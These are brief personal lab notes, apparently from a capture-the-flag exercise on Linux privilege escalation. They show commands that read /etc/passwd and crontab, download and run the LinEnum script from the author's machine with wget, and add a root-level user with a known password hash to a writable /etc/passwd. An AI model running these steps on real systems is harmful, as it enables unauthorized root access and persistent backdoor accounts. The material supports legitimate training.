# COMMON LINUX PRIVESC

```
export IP=10.10.8.224
```

```
ssh user3@$IP
password
```

```
cat /etc/passwd 
cat /etc/shell
cat /etc/crontab
```

## LinEnum

In my machine:
```
python3 -m http.server 1234
```
In the taget machine:
```
wget http://MY-IP:1234/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh | tee linenum.out
```

change to user7:
```
openssl passwd -1 -salt new 123
```
```
su user7
password

nano /etc/passwd

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
su new
123
```

And ta-da, superuser mode!

```
sudo -l
```